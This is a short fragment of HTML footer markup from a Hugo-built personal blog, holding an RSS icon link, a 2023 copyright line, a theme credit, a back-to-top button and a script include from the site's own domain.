href=index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2023 elma.
Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentcolor" stroke="currentcolor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg></a><script src=https://blog.caprinux.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30+lSNuSkl4QXuNyy8="></script></body></html>